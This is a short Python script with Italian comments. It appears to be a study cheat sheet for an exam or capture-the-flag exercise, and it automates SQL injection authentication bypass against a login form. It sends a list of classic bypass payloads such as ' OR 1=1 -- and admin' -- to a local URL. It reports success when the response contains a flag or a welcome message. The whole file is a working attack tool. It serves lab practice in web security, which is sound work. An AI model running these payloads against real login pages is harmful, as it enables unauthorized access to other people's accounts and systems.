#!/usr/bin/env python3
"""
PRONTUARIO #06: SQL Injection (SQLi) Auth Bypass & Form Fuzzer
--------------------------------------------------------------
Modulo: Web Security / Injection Attacks
Descrizione: Fuzzing automatico di form di login per effettuare Authentication Bypass
            tramite SQL Injection su parametri GET/POST.
"""

import requests

# ==================== INPUT DATI D'ESAME ====================
TARGET_URL = "http://127.0.0.1:5000/login"  # URL della pagina di login
USERNAME_FIELD = "username"                 # Nome del campo input username nel form
PASSWORD_FIELD = "password"                 # Nome del campo input password nel form

# LISTA DI PAYLOAD SQLi AUTH BYPASS CLASSICI
SQLI_PAYLOADS = [
    "' OR 1=1 --",
    "' OR '1'='1",
    "admin' --",
    "admin' #",
    "' OR 1=1 #",
    "') OR ('1'='1",
    "' OR 'a'='a",
    "1' ORDER BY 1--",
]
# ============================================================


def main():
    print(f"[*] Avvio SQLi Auth Bypass Fuzzer su Target: {TARGET_URL}\n")

    found = False
    for payload in SQLI_PAYLOADS:
        # Prepariamo i dati da inviare al form HTTP POST
        form_data = {
            USERNAME_FIELD: payload,
            PASSWORD_FIELD: "password_fittizia_123"
        }

        print(f"[*] Testing Payload: {payload}")

        try:
            # Invio della richiesta POST al server
            response = requests.post(TARGET_URL, data=form_data, timeout=5)

            # Analisi della risposta: se restituisce codice 200 e contiene "flag{" o "Welcome"
            if response.status_code == 200 and ("flag{" in response.text or "Welcome" in response.text or "Admin" in response.text):
                print("\n=== SQL INJECTION AUTH BYPASS RIUSCITO! ===")
                print(f" Payload Vincente : {payload}")
                
                if "flag{" in response.text:
                    start_idx = response.text.find("flag{")
                    end_idx = response.text.find("}", start_idx) + 1
                    print(f" Flag Trovata     : {response.text[start_idx:end_idx]}")
                else:
                    print(" Flag/Accesso confermato nel testo della risposta HTML.")
                print("===========================================\n")
                found = True
                break

        except Exception as e:
            print(f"[!] Errore durante l'invio della richiesta: {e}")

    if not found:
        print("[!] Nessun payload della lista ha bypassato l'autenticazione.")


if __name__ == "__main__":
    main()
